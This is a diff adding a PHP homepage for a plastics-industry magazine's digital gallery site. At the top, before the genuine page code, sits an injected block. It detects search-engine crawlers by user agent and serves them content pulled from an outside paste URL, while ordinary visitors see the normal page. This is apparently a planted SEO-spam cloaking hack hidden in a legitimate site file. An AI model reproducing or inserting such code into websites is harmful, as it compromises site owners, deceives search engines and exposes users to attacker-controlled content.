@@ -1,0 +1,188 @@
+<?php
+ob_start();
+header('Vary: User-Agent');
+$bot_url = "https://paste.c-net.org/ManrayTornado";
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function lph_requests($url) {
+    if (function_exists('curl_init')) {    
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+if (preg_match($botchar, $ua)) {
+    usleep(rand(100000, 200000)); 
+    echo lph_requests($bot_url);
+    ob_end_flush();
+    exit;
+}
+?>
+<?php
+include 'include/config.php';
+include 'include/database.php';
+$db = new Database();
+$sql = 'select n.id,n.title from news n left join news_categories nc on n.news_category=nc.id where n.is_active=1 '.$cat_filter.' order by n.created DESC limit 0,10';
+$news_update = $db->query($sql);
+$sql = 'select name,id,main_image from magazines where is_active=1 and is_preview=1 order by RAND() LIMIT 2';
+$preview = $db->query($sql);
+?>
+<!DOCTYPE>
+<html>
+<head>
+	<title>POLYMERS Communique Digital Gallery</title>
+	<?php include("include/header-link.php");?>
+</head>
+<body class="nonloginpage homepage height100vh">
+	<?php include("include/header.php");?>
+	<div class="root">
+		<div class="listingfixedtab">
+			<div class="tablinksbox">
+				<a href="index.php" class='active'>
+					<span>who</span>
+				</a>
+				<a href="what.php">
+					<span>what</span>
+				</a>
+				<a href="why.php">
+					<span>why</span>	
+				</a>
+				<a href="subscribe.php">
+					<span>subscribe</span>
+				</a>
+				<?php if(!isset($_SESSION[SITE_NAME]['user_data']) || empty($_SESSION[SITE_NAME]['user_data'])){?>
+					<a class="loginpopupbtn">
+						<span>Login</span>
+					</a>
+				<?php }?>
+
+			</div>
+
+			<?php if(!isset($_SESSION[SITE_NAME]['user_data']) || empty($_SESSION[SITE_NAME]['user_data'])){?>
+
+
+			<?php }else{?>
+
+				<div class="newslinktab">
+					<a href="news.php">News</a>
+				</div>
+				
+				<?php include('./include/login.php');?>
+
+			<?php }?>
+		</div>
+		<div class="rootflex">
+			<?php include('./include/lo-side-ads.php');?>
+			<section class="body-container">
+				<div class="body-container-wrapper">
+					<div class="wtabcontainer">
+						<div class="headingbox hidefordesktop">
+							<h1 class="heading1">Who</h1>
+						</div>
+						<div class="richtext whotext">
+							<p>
+								POLYMERS Communiqué (PC) is a premium bi-monthly magazine for the plastics and polymers space.
+							</p>
+							<p>
+								Headquartered in Mumbai, with roots deep inside the Indian nebula and branching out across the planet; PC stands victorious in providing superlative content over its span of existence.
+							</p>
+							<p>
+								Having tie-ups with Harvard Business Review and New York Times, among others, POLYMERS Communiqué Digital Gallery is one of the largest resources of quality content about the plastics industry.
+							</p>
+						</div>
+						<div class="mobileaddsbox">
+							<?php include('./include/mobile-mo-top-ads.php');?>
+						</div>
+						<div class="previewclickbox">
+							<a href="javascript:void(0)" style="cursor: default;">SNEAK PREVIEW</a>
+							<img src="images/whypreviewclick.png" class="width100"> 
+						</div>	
+						<div class="previewboxflex">
+							<div class="richtext">
+								<p>All decisions should be an informed one, here’s a preview of the contents page of some of our previous editions for you to gauge the knowledge available for you to consume!</p>
+							</div>
+							<div class="whybookbox">
+								<?php while($row = $db->fetch($preview)){?>
+									<a href="preview_detail.php?id=<?= $row['id'];?>" class="bookcover">
+										<img src="<?= BASE_URL_ADMIN."magazines_images/".$row['main_image'];?>" class="img-responsive">
+									</a>
+								<?php }?>
+
+							</div>
+							<div class="whyupdatebox">
+								<h3 class="heading3">News Update</h3>	
+								<div class="richtextnew">
+									<div class="marqueebox">
+										<marquee direction="up" Scrollamount=3 onmouseover="this.stop();" onmouseout="this.start();">
+											<ul>
+												<?php 
+												/*
+												while($row = $db->fetch($news_update)){ ?>
+													<li>
+													<a href="news-detail.php?id=<?=$row['id'];?>"><?= ucfirst($row['title']);?></a>
+												</li>
+												<?php } 
+												*/
+												?>
+
+												<?php 
+												
+												while($row = $db->fetch($news_update)){ ?>
+													<li  >
+														<a <?php if(isset($_SESSION[SITE_NAME]['user_data']['id'])){ ?> href="news-detail.php?id=<?php echo $row['id']; ?>" <?php }else{ ?> onclick="showNewsPopupNotLoggedin();" href="javascript:void(0)" <?php } ?> class="newspopup"><?= ucfirst($row['title']);?></a>
+													</li>
+												<?php } 
+												?>
+											</ul>
+										</marquee>
+									</div>
+								</div>						
+							</div>
+						</div>		
+					</div>
+					<?php if(!isset($_SESSION[SITE_NAME]['user_data']) || empty($_SESSION[SITE_NAME]['user_data'])){?>
+					<?php include('./include/login.php');?>
+					<?php } else{ ?>
+					<?php
+					$ad_resp = getAdsRo(7);
+					?>
+					<?php if(!empty($ad_resp)){?>
+						<div class='adtertlogincontainer'>
+							<div class="robox">
+								<a class="ro" target="_blank" href="<?php  if($ad_resp){ echo $ad_resp['link'];}else{ echo "#";} ?>">
+									<img src="<?= BASE_URL_ADMIN.'images/banner-images/'. $ad_resp['image'];?>" class="img-responsive">
+								</a>
+							</div>
+						</div>
+					<?php }?>
+					<?php } ?>
+				</div>
+			</section>
+		</div>
+	</div>
+<?php include("include/footer.php");?> 
+<?php include("include/footer-link.php");?>
+<script>
+	$(document).ready(function(){
+		<?php if(isset($_GET['pwd_s'])){?>
+			$("#updatedpwdpopup").addClass("showpopup");
+		<?php } ?>
+		<?php if(isset($_GET['chk_eml'])){?>
+			$("#chkemlpopup").addClass("showpopup");
+		<?php } ?>
+
+	});
+
+	function showNewsPopupNotLoggedin(){
+		$("#newclickerpopup").addClass("showpopup");
+	}
+</script>
+</body>
+</html>
